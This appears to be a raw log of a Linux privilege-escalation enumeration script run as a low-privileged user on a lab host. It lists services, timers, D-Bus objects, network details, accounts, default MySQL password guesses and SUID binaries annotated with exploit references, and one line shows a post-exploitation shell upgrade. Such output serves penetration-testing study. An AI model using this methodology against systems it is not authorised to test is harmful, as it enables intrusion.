drwxr-xr-x 102 root root 4096 May 18 2022 .. -rw-r--r-- 1 root root 201 Feb 14 2020 e2scrub_all -rw-r--r-- 1 root root 712 Mar 27 2020 php -rw-r--r-- 1 root root 102 Feb 13 2020 .placeholder -rw-r--r-- 1 root root 190 Jul 31 2020 popularity-contest /etc/cron.daily: total 52 drwxr-xr-x 2 root root 4096 May 18 2022 . drwxr-xr-x 102 root root 4096 May 18 2022 .. -rwxr-xr-x 1 root root 539 Sep 30 2020 apache2 -rwxr-xr-x 1 root root 376 Dec 4 2019 apport -rwxr-xr-x 1 root root 1478 Apr 9 2020 apt-compat -rwxr-xr-x 1 root root 355 Dec 29 2017 bsdmainutils -rwxr-xr-x 1 root root 1187 Sep 5 2019 dpkg -rwxr-xr-x 1 root root 377 Jan 21 2019 logrotate -rwxr-xr-x 1 root root 1123 Feb 25 2020 man-db -rw-r--r-- 1 root root 102 Feb 13 2020 .placeholder -rwxr-xr-x 1 root root 4574 Jul 18 2019 popularity-contest -rwxr-xr-x 1 root root 214 Apr 2 2020 update-notifier-common /etc/cron.hourly: total 12 drwxr-xr-x 2 root root 4096 Jul 31 2020 . drwxr-xr-x 102 root root 4096 May 18 2022 .. -rw-r--r-- 1 root root 102 Feb 13 2020 .placeholder /etc/cron.monthly: total 12 drwxr-xr-x 2 root root 4096 Jul 31 2020 . drwxr-xr-x 102 root root 4096 May 18 2022 .. -rw-r--r-- 1 root root 102 Feb 13 2020 .placeholder /etc/cron.weekly: total 20 drwxr-xr-x 2 root root 4096 May 11 2022 . drwxr-xr-x 102 root root 4096 May 18 2022 .. -rwxr-xr-x 1 root root 813 Feb 25 2020 man-db -rw-r--r-- 1 root root 102 Feb 13 2020 .placeholder -rwxr-xr-x 1 root root 403 Aug 5 2021 update-notifier-common SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin [+] Services [i] Search for outdated versions [ - ] apache-htcacheclean [ + ] apache2 [ + ] apparmor [ + ] apport [ + ] atd [ - ] console-setup.sh [ + ] cron [ - ] cryptdisks [ - ] cryptdisks-early [ + ] dbus [ - ] grub-common [ - ] hwclock.sh [ - ] irqbalance [ - ] iscsid [ - ] keyboard-setup.sh [ + ] kmod [ - ] lvm2 [ - ] lvm2-lvmpolld [ + ] multipath-tools [ + ] mysql [ + ] netfilter-persistent [ - ] open-iscsi [ + ] open-vm-tools [ - ] plymouth [ - ] plymouth-log [ + ] procps [ - ] rsync [ + ] rsyslog [ - ] screen-cleanup [ + ] ssh [ + ] udev [ + ] ufw [ + ] unattended-upgrades [ - ] uuidd [+] Systemd PATH [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin [+] Analyzing .service files [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services /lib/systemd/system/atd.service is executing some relative path /lib/systemd/system/grub-common.service is executing some relative path /lib/systemd/system/initrd-cleanup.service is executing some relative path /lib/systemd/system/initrd-parse-etc.service is executing some relative path /lib/systemd/system/initrd-switch-root.service is executing some relative path /lib/systemd/system/initrd-udevadm-cleanup-db.service is executing some relative path /lib/systemd/system/mdmonitor-oneshot.service is executing some relative path /lib/systemd/system/sysinit.target.wants/systemd-boot-system-token.service is executing some relative path /lib/systemd/system/sysinit.target.wants/systemd-hwdb-update.service is executing some relative path /lib/systemd/system/sysinit.target.wants/systemd-journal-flush.service is executing some relative path /lib/systemd/system/sysinit.target.wants/systemd-machine-id-commit.service is executing some relative path /lib/systemd/system/sysinit.target.wants/systemd-sysusers.service is executing some relative path /lib/systemd/system/sysinit.target.wants/systemd-udevd.service is executing some relative path /lib/systemd/system/sysinit.target.wants/systemd-udev-trigger.service is executing some relative path /lib/systemd/system/systemd-ask-password-console.service is executing some relative path /lib/systemd/system/systemd-ask-password-wall.service is executing some relative path /lib/systemd/system/systemd-boot-system-token.service is executing some relative path /lib/systemd/system/systemd-halt.service is executing some relative path /lib/systemd/system/systemd-hwdb-update.service is executing some relative path /lib/systemd/system/systemd-journal-flush.service is executing some relative path /lib/systemd/system/systemd-kexec.service is executing some relative path /lib/systemd/system/systemd-machine-id-commit.service is executing some relative path /lib/systemd/system/systemd-sysusers.service is executing some relative path /lib/systemd/system/systemd-tmpfiles-clean.service is executing some relative path /lib/systemd/system/systemd-udevd.service is executing some relative path /lib/systemd/system/systemd-udev-settle.service is executing some relative path /lib/systemd/system/systemd-udev-trigger.service is executing some relative path /lib/systemd/system/udev.service is executing some relative path /lib/systemd/user/systemd-tmpfiles-clean.service is executing some relative path /lib/systemd/user/systemd-tmpfiles-setup.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/initrd-cleanup.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/initrd-parse-etc.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/initrd-switch-root.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/initrd-udevadm-cleanup-db.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/sysinit.target.wants/systemd-boot-system-token.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/sysinit.target.wants/systemd-hwdb-update.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/sysinit.target.wants/systemd-journal-flush.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/sysinit.target.wants/systemd-machine-id-commit.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/sysinit.target.wants/systemd-sysusers.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/sysinit.target.wants/systemd-udevd.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/sysinit.target.wants/systemd-udev-trigger.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/systemd-ask-password-console.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/systemd-ask-password-wall.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/systemd-boot-system-token.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/systemd-halt.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/systemd-hwdb-update.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/systemd-journal-flush.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/systemd-kexec.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/systemd-machine-id-commit.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/systemd-sysusers.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/systemd-tmpfiles-clean.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/systemd-udevd.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/systemd-udev-settle.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/systemd-udev-trigger.service is executing some relative path /snap/core20/1434/usr/lib/systemd/system/udev.service is executing some relative path /snap/core20/1434/usr/lib/systemd/user/systemd-tmpfiles-clean.service is executing some relative path /snap/core20/1434/usr/lib/systemd/user/systemd-tmpfiles-setup.service is executing some relative path You can\u0026#39;t write on systemd PATH [+] System timers [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers NEXT LEFT LAST PASSED UNIT ACTIVATES Thu 2023-05-18 09:39:00 UTC 37s left Thu 2023-05-18 09:09:09 UTC 29min ago phpsessionclean.timer phpsessionclean.service Thu 2023-05-18 10:15:11 UTC 36min left Fri 2023-02-17 18:26:57 UTC 2 months 28 days ago ua-timer.timer ua-timer.service Thu 2023-05-18 16:11:47 UTC 6h left Thu 2023-05-18 07:36:21 UTC 2h 2min ago motd-news.timer motd-news.service Thu 2023-05-18 19:50:41 UTC 10h left Fri 2023-02-17 10:52:35 UTC 2 months 29 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service Thu 2023-05-18 22:50:33 UTC 13h left Thu 2023-05-18 07:36:21 UTC 2h 2min ago fwupd-refresh.timer fwupd-refresh.service Fri 2023-05-19 00:00:00 UTC 14h left Thu 2023-05-18 07:36:21 UTC 2h 2min ago logrotate.timer logrotate.service Fri 2023-05-19 00:00:00 UTC 14h left Thu 2023-05-18 07:36:21 UTC 2h 2min ago man-db.timer man-db.service Fri 2023-05-19 02:22:56 UTC 16h left Thu 2023-05-18 07:36:21 UTC 2h 2min ago apt-daily.timer apt-daily.service Fri 2023-05-19 06:55:10 UTC 21h left Thu 2023-05-18 07:36:21 UTC 2h 2min ago apt-daily-upgrade.timer apt-daily-upgrade.service Sun 2023-05-21 03:10:01 UTC 2 days left Thu 2023-05-18 07:36:21 UTC 2h 2min ago e2scrub_all.timer e2scrub_all.service Mon 2023-05-22 00:00:00 UTC 3 days left Thu 2023-05-18 07:36:21 UTC 2h 2min ago fstrim.timer fstrim.service n/a n/a n/a n/a snapd.snap-repair.timer snapd.snap-repair.service n/a n/a n/a n/a ua-license-check.timer ua-license-check.service [+] Analyzing .timer files [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers [+] Analyzing .socket files [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets [+] HTTP sockets [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets Socket /run/user/1000/snapd-session-agent.socket owned by bob uses HTTP. Response to /index: {\u0026#34;type\u0026#34;:\u0026#34;error\u0026#34;,\u0026#34;result\u0026#34;:{\u0026#34;message\u0026#34;:\u0026#34;method \\\u0026#34;GET\\\u0026#34; not allowed\u0026#34;}} Socket /run/snapd.socket owned by root uses HTTP. Response to /index: {\u0026#34;type\u0026#34;:\u0026#34;sync\u0026#34;,\u0026#34;status-code\u0026#34;:200,\u0026#34;status\u0026#34;:\u0026#34;OK\u0026#34;,\u0026#34;result\u0026#34;:[\u0026#34;TBD\u0026#34;]} Socket /run/snapd-snap.socket owned by root uses HTTP. Response to /index: {\u0026#34;type\u0026#34;:\u0026#34;error\u0026#34;,\u0026#34;status-code\u0026#34;:403,\u0026#34;status\u0026#34;:\u0026#34;Forbidden\u0026#34;,\u0026#34;result\u0026#34;:{\u0026#34;message\u0026#34;:\u0026#34;access denied\u0026#34;,\u0026#34;kind\u0026#34;:\u0026#34;login-required\u0026#34;}} [+] D-Bus config files [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf ( \u0026lt;policy group=\u0026#34;power\u0026#34;\u0026gt;) [+] D-Bus Service Objects list [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus NAME PID PROCESS USER CONNECTION UNIT SESSION DESCRIPTION :1.0 785 systemd-network systemd-network :1.0 systemd-networkd.service - - :1.1 798 systemd-resolve systemd-resolve :1.1 systemd-resolved.service - - :1.10 1025 ModemManager root :1.10 ModemManager.service - - :1.11 888 snapd root :1.11 snapd.service - - :1.153 46533 busctl bob :1.153 session-42.scope 42 - :1.2 657 systemd-timesyn systemd-timesync :1.2 systemd-timesyncd.service - - :1.3 1 systemd root :1.3 init.scope - - :1.35 25152 systemd bob :1.35 user@1000.service - - :1.4 890 systemd-logind root :1.4 systemd-logind.service - - :1.5 868 accounts-daemon root :1.5 accounts-daemon.service - - :1.6 885 polkitd root :1.6 polkit.service - - :1.7 881 networkd-dispat root :1.7 networkd-dispatcher.service - - :1.8 892 udisksd root :1.8 udisks2.service - - :1.9 1020 unattended-upgr root :1.9 unattended-upgrades.service - - com.ubuntu.LanguageSelector - - - (activatable) - - - com.ubuntu.SoftwareProperties - - - (activatable) - - - io.netplan.Netplan - - - (activatable) - - - org.freedesktop.Accounts 868 accounts-daemon root :1.5 accounts-daemon.service - - org.freedesktop.DBus 1 systemd root - init.scope - - org.freedesktop.ModemManager1 1025 ModemManager root :1.10 ModemManager.service - - org.freedesktop.PackageKit - - - (activatable) - - - org.freedesktop.PolicyKit1 885 polkitd root :1.6 polkit.service - - org.freedesktop.UDisks2 892 udisksd root :1.8 udisks2.service - - org.freedesktop.UPower - - - (activatable) - - - org.freedesktop.bolt - - - (activatable) - - - org.freedesktop.fwupd - - - (activatable) - - - org.freedesktop.hostname1 - - - (activatable) - - - org.freedesktop.locale1 - - - (activatable) - - - org.freedesktop.login1 890 systemd-logind root :1.4 systemd-logind.service - - org.freedesktop.network1 785 systemd-network systemd-network :1.0 systemd-networkd.service - - org.freedesktop.resolve1 798 systemd-resolve systemd-resolve :1.1 systemd-resolved.service - - org.freedesktop.systemd1 1 systemd root :1.3 init.scope - - org.freedesktop.thermald - - - (activatable) - - - org.freedesktop.timedate1 - - - (activatable) - - - org.freedesktop.timesync1 657 systemd-timesyn systemd-timesync :1.2 systemd-timesyncd.service - - ═══════════════════════════════════╣ Network Information ╠════════════════════════════════════ [+] Hostname, hosts and DNS wheels 127.0.0.1 localhost 127.0.0.1 wheels nameserver 127.0.0.53 options edns0 trust-ad [+] Content of /etc/inetd.conf \u0026amp; /etc/xinetd.conf /etc/inetd.conf Not Found [+] Interfaces # symbolic names for networks, see networks(5) for more information link-local 169.254.0.0 ens160: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 192.168.195.202 netmask 255.255.255.0 broadcast 192.168.195.255 ether 00:50:56:ba:7b:fd txqueuelen 1000 (Ethernet) RX packets 25147 bytes 3473024 (3.4 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 22410 bytes 8611617 (8.6 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 115904 bytes 8234756 (8.2 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 115904 bytes 8234756 (8.2 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 [+] Networks and neighbours Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface default _gateway 0.0.0.0 UG 0 0 0 ens160 192.168.195.0 0.0.0.0 255.255.255.0 U 0 0 0 ens160 Address HWtype HWaddress Flags Mask Iface _gateway ether 00:50:56:ba:f3:39 C ens160 [+] Iptables rules iptables rules Not Found [+] Active Ports [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - [+] Can I sniff with tcpdump? No ════════════════════════════════════╣ Users Information ╠════════════════════════════════════ [+] My user [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users uid=1000(bob) gid=1000(bob) groups=1000(bob) [+] Do I have PGP keys? /usr/bin/gpg netpgpkeys Not Found netpgp Not Found [+] Clipboard or highlighted text? xsel and xclip Not Found [+] Checking \u0026#39;sudo -l\u0026#39;, /etc/sudoers, and /etc/sudoers.d [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid Sorry, try again. [+] Checking sudo tokens [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens /proc/sys/kernel/yama/ptrace_scope is not enabled (1) gdb wasn\u0026#39;t found in PATH [+] Checking doas.conf /etc/doas.conf Not Found [+] Checking Pkexec policy [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2 [Configuration] AdminIdentities=unix-user:0 [Configuration] AdminIdentities=unix-group:sudo;unix-group:admin [+] Superusers root:x:0:0:root:/root:/bin/bash [+] Users with console bob:x:1000:1000::/home/bob:/bin/sh root:x:0:0:root:/root:/bin/bash [+] All users \u0026amp; groups uid=0(root) gid=0(root) groups=0(root) uid=1000(bob) gid=1000(bob) groups=1000(bob) uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network) uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve) uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync) uid=103(messagebus) gid=106(messagebus) groups=106(messagebus) uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty) uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup) uid=106(tss) gid=111(tss) groups=111(tss) uid=107(uuidd) gid=112(uuidd) groups=112(uuidd) uid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump) uid=109(landscape) gid=115(landscape) groups=115(landscape) uid=10(uucp) gid=10(uucp) groups=10(uucp) uid=110(pollinate) gid=1(daemon[0m) groups=1(daemon[0m) uid=111(sshd) gid=65534(nogroup) groups=65534(nogroup) uid=112(usbmux) gid=46(plugdev) groups=46(plugdev) uid=113(mysql) gid=117(mysql) groups=117(mysql) uid=13(proxy) gid=13(proxy) groups=13(proxy) uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m) uid=2(bin) gid=2(bin) groups=2(bin) uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=34(backup) gid=34(backup) groups=34(backup) uid=38(list) gid=38(list) groups=38(list) uid=39(irc) gid=39(irc) groups=39(irc) uid=3(sys) gid=3(sys) groups=3(sys) uid=41(gnats) gid=41(gnats) groups=41(gnats) uid=4(sync) gid=65534(nogroup) groups=65534(nogroup) uid=5(games) gid=60(games) groups=60(games) uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup) uid=6(man) gid=12(man) groups=12(man) uid=7(lp) gid=7(lp) groups=7(lp) uid=8(mail) gid=8(mail) groups=8(mail) uid=998(lxd) gid=100(users) groups=100(users) uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump) uid=9(news) gid=9(news) groups=9(news) [+] Login now 09:38:32 up 14:03, 1 user, load average: 0.36, 0.10, 0.03 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT bob pts/0 192.168.45.156 09:31 24.00s 0.03s 0.03s python3 -c import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;); [+] Last logons root pts/1 Tue May 17 19:23:01 2022 - Tue May 17 19:23:02 2022 (00:00) 192.168.118.14 bob pts/0 Tue May 17 19:22:53 2022 - Tue May 17 19:23:02 2022 (00:00) 192.168.118.14 reboot system boot Tue May 17 19:21:47 2022 still running 0.0.0.0 root tty1 Wed May 11 11:04:58 2022 - down (00:00) 0.0.0.0 bob pts/0 Wed May 11 11:03:27 2022 - Wed May 11 11:05:09 2022 (00:01) 192.168.118.18 reboot system boot Wed May 11 11:01:18 2022 - Wed May 11 11:05:10 2022 (00:03) 0.0.0.0 root pts/0 Wed May 11 10:58:06 2022 - down (00:01) 192.168.118.18 reboot system boot Wed May 11 10:56:26 2022 - Wed May 11 11:00:03 2022 (00:03) 0.0.0.0 wtmp begins Wed May 11 10:14:08 2022 [+] Last time logon each user Username Port From Latest root pts/1 192.168.118.14 Tue May 17 19:23:01 +0000 2022 bob pts/0 192.168.45.156 Thu May 18 09:31:29 +0000 2023 [+] Password policy PASS_MAX_DAYS 99999 PASS_MIN_DAYS 0 PASS_WARN_AGE 7 ENCRYPT_METHOD SHA512 [+] Do not forget to test \u0026#39;su\u0026#39; as any other user with shell: without password and with their names as password (I can\u0026#39;t do it...) [+] Do not forget to execute \u0026#39;sudo -l\u0026#39; without password or with valid password (if you know it)!! ═══════════════════════════════════╣ Software Information ╠═══════════════════════════════════ [+] MySQL version mysql Ver 15.1 Distrib 10.3.34-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2 [+] MySQL connection using default root/root ........... No [+] MySQL connection using root/toor ................... No [+] MySQL connection using root/NOPASS ................. No [+] Searching mysql credentials and exec From \u0026#39;/etc/mysql/mariadb.conf.d/50-server.cnf\u0026#39; Mysql user: user = mysql Found readable /etc/mysql/my.cnf [client-server] !includedir /etc/mysql/conf.d/ !includedir /etc/mysql/mariadb.conf.d/ [+] PostgreSQL version and pgadmin credentials Not Found [+] PostgreSQL connection to template0 using postgres/NOPASS ........ No [+] PostgreSQL connection to template1 using postgres/NOPASS ........ No [+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No [+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No [+] Apache server info Version: Server version: Apache/2.4.41 (Ubuntu) Server built: 2022-03-16T16:52:53 PHP exec extensions /etc/apache2/mods-available/php7.4.conf-\u0026lt;FilesMatch \u0026#34;.+\\.ph(ar|p|tml)$\u0026#34;\u0026gt; /etc/apache2/mods-available/php7.4.conf: SetHandler application/x-httpd-php -- /etc/apache2/mods-available/php7.4.conf-\u0026lt;FilesMatch \u0026#34;.+\\.phps$\u0026#34;\u0026gt; /etc/apache2/mods-available/php7.4.conf: SetHandler application/x-httpd-php-source -- /etc/apache2/mods-enabled/php7.4.conf-\u0026lt;FilesMatch \u0026#34;.+\\.ph(ar|p|tml)$\u0026#34;\u0026gt; /etc/apache2/mods-enabled/php7.4.conf: SetHandler application/x-httpd-php -- /etc/apache2/mods-enabled/php7.4.conf-\u0026lt;FilesMatch \u0026#34;.+\\.phps$\u0026#34;\u0026gt; /etc/apache2/mods-enabled/php7.4.conf: SetHandler application/x-httpd-php-source [+] Searching PHPCookies Not Found [+] Searching Wordpress wp-config.php files wp-config.php Not Found [+] Searching Drupal settings.php files /default/settings.php Not Found [+] Searching Moodle config.php files config.php inside a moodle folder Not Found [+] Searching Tomcat users file tomcat-users.xml Not Found [+] Mongo information mongo binary Not Found [+] Searching supervisord configuration file supervisord.conf Not Found [+] Searching cesi configuration file cesi.conf Not Found [+] Searching Rsyncd config file rsyncd.conf Not Found [+] Searching Hostapd config file hostapd.conf Not Found [+] Searching wifi conns file Not Found [+] Searching Anaconda-ks config files anaconda-ks.cfg Not Found [+] Searching .vnc directories and their passwd files .vnc Not Found [+] Searching ldap directories and their hashes /etc/ldap The password hash is from the {SSHA} to \u0026#39;structural\u0026#39; [+] Searching .ovpn files and credentials .ovpn Not Found [+] Searching ssl/ssh files PermitRootLogin yes PermitRootLogin yes ChallengeResponseAuthentication no UsePAM yes PasswordAuthentication yes --\u0026gt; /etc/hosts.allow file found, read the rules: /etc/hosts.allow Searching inside /etc/ssh/ssh_config for interesting info Include /etc/ssh/ssh_config.d/*.conf Host * SendEnv LANG LC_* HashKnownHosts yes GSSAPIAuthentication yes [+] Searching unexpected auth lines in /etc/pam.d/sshd No [+] Searching Cloud credentials (AWS, Azure, GC) [+] NFS exports? [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe /etc/exports Not Found [+] Searching kerberos conf files and tickets [i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt tickets kerberos Not Found klist Not Found [+] Searching Kibana yaml kibana.yml Not Found [+] Searching Knock configuration Knock.config Not Found [+] Searching logstash files Not Found [+] Searching elasticsearch files Not Found [+] Searching Vault-ssh files vault-ssh-helper.hcl Not Found [+] Searching AD cached hashes cached hashes Not Found [+] Searching screen sessions [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions No Sockets found in /run/screen/S-bob. [+] Searching tmux sessions [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions tmux Not Found [+] Searching Couchdb directory [+] Searching redis.conf [+] Searching dovecot files dovecot credentials Not Found [+] Searching mosquitto.conf [+] Searching neo4j auth file [+] Searching Cloud-Init conf file [+] Searching Erlang cookie file [+] Searching GVM auth file [+] Searching IPSEC files [+] Searching IRSSI files [+] Searching Keyring files Keyring folder: /usr/share/keyrings /usr/share/keyrings: total 52 -rw-r--r-- 1 root root 2247 Oct 1 2021 ubuntu-advantage-cc-eal.gpg -rw-r--r-- 1 root root 2274 Jan 25 2021 ubuntu-advantage-cis.gpg -rw-r--r-- 1 root root 2236 Oct 15 2020 ubuntu-advantage-esm-apps.gpg -rw-r--r-- 1 root root 2264 Oct 15 2020 ubuntu-advantage-esm-infra-trusty.gpg -rw-r--r-- 1 root root 2275 Oct 15 2020 ubuntu-advantage-fips.gpg -rw-r--r-- 1 root root 2235 Oct 1 2021 ubuntu-advantage-ros.gpg -rw-r--r-- 1 root root 7399 Sep 17 2018 ubuntu-archive-keyring.gpg -rw-r--r-- 1 root root 6713 Oct 27 2016 ubuntu-archive-removed-keys.gpg -rw-r--r-- 1 root root 4097 Feb 6 2018 ubuntu-cloudimage-keyring.gpg -rw-r--r-- 1 root root 0 Jan 17 2018 ubuntu-cloudimage-removed-keys.gpg -rw-r--r-- 1 root root 1227 May 27 2010 ubuntu-master-keyring.gpg [+] Searching Filezilla sites file [+] Searching backup-manager files [+] Searching uncommon passwd files (splunk) [+] Searching GitLab related files [+] Searching PGP/GPG PGP/GPG software: /usr/bin/gpg netpgpkeys Not Found netpgp Not Found [+] Searching vim files [+] Checking if containerd(ctr) is available [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation [+] Checking if runc is available [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation [+] Searching docker files [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket [+] Interesting Firefox Files [i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox [+] Interesting Chrome Files [i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox [+] Autologin Files [+] S/Key authentication [+] YubiKey authentication [+] Passwords inside pam.d [+] FastCGI Params [+] SNMPs ════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════ [+] SUID - Check easy privesc, exploits and write perms [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid strings Not Found -rwsr-sr-x 1 daemon daemon 55K Nov 12 2018 /usr/bin/at ---\u0026gt; RTru64_UNIX_4.0g(CVE-2002-1614) -rwsr-xr-x 1 root root 427K Mar 4 2019 /snap/core18/2128/usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 59K Mar 22 2019 /snap/core18/2128/usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 40K Mar 22 2019 /snap/core18/2128/usr/bin/newgrp ---\u0026gt; HP-UX_10.20 -rwsr-xr-x 1 root root 75K Mar 22 2019 /snap/core18/2128/usr/bin/gpasswd -rwsr-xr-x 1 root root 44K Mar 22 2019 /snap/core18/2128/usr/bin/chsh -rwsr-xr-x 1 root root 75K Mar 22 2019 /snap/core18/2128/usr/bin/chfn ---\u0026gt; SuSE_9.3/10 -rwsr-xr-x 1 root root 44K Mar 22 2019 /snap/core18/2128/bin/su -rwsr-xr-x 1 root root 63K Jun 28 2019 /snap/core18/2409/bin/ping -rwsr-xr-x 1 root root 63K Jun 28 2019 /snap/core18/2128/bin/ping -rwsr-xr-x 1 root root 15K Jul 8 2019 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 427K Mar 3 2020 /snap/core18/2409/usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 39K Mar 7 2020 /usr/bin/fusermount -rwsr-xr-- 1 root systemd-resolve 51K Jun 11 2020 /snap/core20/1434/usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-- 1 root systemd-resolve 42K Jun 11 2020 /snap/core18/2409/usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-- 1 root systemd-resolve 42K Jun 11 2020 /snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 27K Sep 16 2020 /snap/core18/2409/bin/umount ---\u0026gt; BSD/Linux(08-1996) -rwsr-xr-x 1 root root 43K Sep 16 2020 /snap/core18/2409/bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 27K Sep 16 2020 /snap/core18/2128/bin/umount ---\u0026gt; BSD/Linux(08-1996) -rwsr-xr-x 1 root root 43K Sep 16 2020 /snap/core18/2128/bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 163K Jan 19 2021 /usr/bin/sudo -rwsr-xr-x 1 root root 163K Jan 19 2021 /snap/core20/1434/usr/bin/sudo -rwsr-xr-x 1 root root 146K Jan 19 2021 /snap/core18/2409/usr/bin/sudo -rwsr-xr-x 1 root root 146K Jan 19 2021 /snap/core18/2128/usr/bin/sudo -rwsr-xr-x 1 root root 67K Jul 14 2021 /usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 44K Jul 14 2021 /usr/bin/newgrp ---\u0026gt; HP-UX_10.20 -rwsr-xr-x 1 root root 87K Jul 14 2021 /usr/bin/gpasswd -rwsr-xr-x 1 root root 52K Jul 14 2021 /usr/bin/chsh -rwsr-xr-x 1 root root 84K Jul 14 2021 /usr/bin/chfn ---\u0026gt; SuSE_9.3/10 -rwsr-xr-x 1 root root 67K Jul 14 2021 /snap/core20/1434/usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 44K Jul 14 2021 /snap/core20/1434/usr/bin/newgrp ---\u0026gt; HP-UX_10.20 -rwsr-xr-x 1 root root 87K Jul 14 2021 /snap/core20/1434/usr/bin/gpasswd -rwsr-xr-x 1 root root 52K Jul 14 2021 /snap/core20/1434/usr/bin/chsh -rwsr-xr-x 1 root root 84K Jul 14 2021 /snap/core20/1434/usr/bin/chfn ---\u0026gt; SuSE_9.3/10 -rwsr-xr-x 1 root root 463K Dec 2 2021 /usr/lib/openssh/ssh-keysign 